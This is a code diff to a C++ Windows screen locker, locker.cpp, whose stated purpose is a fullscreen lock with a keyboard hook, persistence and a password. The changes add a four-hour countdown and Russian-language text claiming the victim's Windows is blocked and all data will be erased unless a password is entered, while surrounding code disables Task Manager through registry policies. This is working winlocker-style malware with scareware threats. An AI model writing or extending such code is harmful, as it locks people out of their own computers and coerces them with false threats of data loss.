@@ -1,6 +1,6 @@
 // language: C++, file: locker.cpp, target: Windows 10/11 x64, MSVC 2022
 // Build: cl /std:c++17 /EHsc /O2 locker.cpp user32.lib gdi32.lib advapi32.lib shell32.lib bcrypt.lib
-// Purpose: fullscreen locker with keyboard hook, persistence, SHA-256 password.
+// Purpose: fullscreen locker with 4-hour timer, keyboard hook, persistence, SHA-256 password.
 
 #define WIN32_LEAN_AND_MEAN
 #include <windows.h>
@@ -11,16 +11,16 @@
 
 #pragma comment(lib, "bcrypt.lib")
 
-// --- config: SHA-256 of password "letmein" (replace with your own) ---
-// generate: echo -n "yourpass" | sha256sum
-static const char* kHashHex =
-    "d76e70810a49498e5fc5de5ae58297172bc9eb1b4545f24353d9b79a342133a1"  // placeholder — replace full 64 chars
-    "d76e70810a49498e5fc5de5ae58297172bc9eb1b4545f24353d9b79a342133a1";
+// --- config: SHA-256 hash of the password ---
+// Default password is "admin" (hash below). To change it, generate a new hash in PowerShell:
+// $p='yourpass'; $b=[Text.Encoding]::UTF8.GetBytes($p); $h=[Security.Cryptography.SHA256]::Create().ComputeHash($b); ($h|%{$_.ToString('x2')}) -join ''
+static const char* kHashHex = "8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918";
 
 static HHOOK   g_kbHook    = nullptr;
 static HWND    g_hwnd      = nullptr;
 static bool    g_locked    = true;
 static std::wstring g_input;
+static int     g_timeLeft  = 4 * 60 * 60; // 4 hours in seconds
 
 // ---------- SHA-256 ----------
 static std::string Sha256Hex(const std::string& in) {
@@ -100,33 +100,85 @@ static LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lP
 static LRESULT CALLBACK WndProc(HWND h, UINT msg, WPARAM w, LPARAM l) {
     switch (msg) {
     case WM_CREATE: {
-        // topmost, fullscreen, no frame
         int sw = GetSystemMetrics(SM_CXSCREEN);
         int sh = GetSystemMetrics(SM_CYSCREEN);
         SetWindowPos(h, HWND_TOPMOST, 0, 0, sw, sh, SWP_SHOWWINDOW);
         ShowCursor(FALSE);
         g_hwnd = h;
+        
+        // Force focus so typing works
+        SetForegroundWindow(h);
+        SetFocus(h);
+        
+        // Timer for 1 second ticks
+        SetTimer(h, 1, 1000, nullptr);
+        return 0;
+    }
+    case WM_TIMER: {
+        if (w == 1 && g_locked && g_timeLeft > 0) {
+            g_timeLeft--;
+            InvalidateRect(h, nullptr, TRUE);
+        }
         return 0;
     }
     case WM_PAINT: {
         PAINTSTRUCT ps;
         HDC dc = BeginPaint(h, &ps);
         RECT rc; GetClientRect(h, &rc);
+        
+        // Background
         HBRUSH bg = CreateSolidBrush(RGB(10, 10, 14));
         FillRect(dc, &rc, bg);
         DeleteObject(bg);
+        
         SetBkMode(dc, TRANSPARENT);
         SetTextColor(dc, RGB(220, 220, 230));
-        HFONT f = CreateFontW(28, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE,
+        
+        // Fonts
+        HFONT fBig = CreateFontW(48, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE,
             DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
             CLEARTYPE_QUALITY, DEFAULT_PITCH, L"Segoe UI");
-        SelectObject(dc, f);
-        DrawTextW(dc, L"SYSTEM LOCKED", -1, &rc, DT_CENTER | DT_VCENTER | DT_SINGLELINE);
-        // password field below
-        RECT r2 = rc; r2.top += 120;
+        HFONT fMid = CreateFontW(24, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE,
+            DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
+            CLEARTYPE_QUALITY, DEFAULT_PITCH, L"Segoe UI");
+        
+        // Draw Title
+        SelectObject(dc, fBig);
+        RECT rcTitle = rc; rcTitle.top = 100; rcTitle.bottom = 200;
+        DrawTextW(dc, L"ВАШ WINDOWS ЗАБЛОКИРОВАН", -1, &rcTitle, DT_CENTER | DT_VCENTER | DT_SINGLELINE);
+
+        // Draw Warning
+        SetTextColor(dc, RGB(200, 50, 50)); // Red
+        SelectObject(dc, fMid);
+        RECT rcWarn = rc; rcWarn.top = 250; rcWarn.bottom = 350;
+        DrawTextW(dc, L"Если вы не введете пароль, все ваши данные будут стерты через:", -1, &rcWarn, DT_CENTER | DT_VCENTER | DT_SINGLELINE);
+
+        // Draw Timer
+        SetTextColor(dc, RGB(220, 220, 230));
+        SelectObject(dc, fBig);
+        int hours = g_timeLeft / 3600;
+        int minutes = (g_timeLeft % 3600) / 60;
+        int seconds = g_timeLeft % 60;
+        wchar_t timerBuf[64];
+        swprintf_s(timerBuf, L"%02d:%02d:%02d", hours, minutes, seconds);
+        
+        RECT rcTimer = rc; rcTimer.top = 380; rcTimer.bottom = 480;
+        DrawTextW(dc, timerBuf, -1, &rcTimer, DT_CENTER | DT_VCENTER | DT_SINGLELINE);
+
+        // Draw Input Field Label
+        SelectObject(dc, fMid);
+        SetTextColor(dc, RGB(150, 150, 160));
+        RECT rcPrompt = rc; rcPrompt.top = 550; rcPrompt.bottom = 600;
+        DrawTextW(dc, L"Введите пароль:", -1, &rcPrompt, DT_CENTER | DT_VCENTER | DT_SINGLELINE);
+
+        // Draw Stars
+        SetTextColor(dc, RGB(220, 220, 230));
         std::wstring stars(g_input.size(), L'*');
-        DrawTextW(dc, stars.c_str(), -1, &r2, DT_CENTER | DT_VCENTER | DT_SINGLELINE);
-        DeleteObject(f);
+        RECT rcStars = rc; rcStars.top = 600; rcStars.bottom = 650;
+        DrawTextW(dc, stars.c_str(), -1, &rcStars, DT_CENTER | DT_VCENTER | DT_SINGLELINE);
+        
+        DeleteObject(fBig);
+        DeleteObject(fMid);
         EndPaint(h, &ps);
         return 0;
     }
@@ -134,10 +186,6 @@ static LRESULT CALLBACK WndProc(HWND h, UINT msg, WPARAM w, LPARAM l) {
         if (w == VK_BACK && !g_input.empty()) g_input.pop_back();
         else if (w >= 32 && w < 127) g_input.push_back((wchar_t)w);
         InvalidateRect(h, nullptr, TRUE);
-
-        if (g_input.size() >= 1) {
-            // check on Enter (VK_RETURN arrives as WM_KEYDOWN)
-        }
         return 0;
     }
     case WM_KEYDOWN: {
@@ -146,7 +194,6 @@ static LRESULT CALLBACK WndProc(HWND h, UINT msg, WPARAM w, LPARAM l) {
             std::string h2 = Sha256Hex(ascii);
             if (h2 == kHashHex) {
                 g_locked = false;
-                // restore task manager
                 HKEY hk;
                 if (RegOpenKeyExW(HKEY_CURRENT_USER,
                     L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
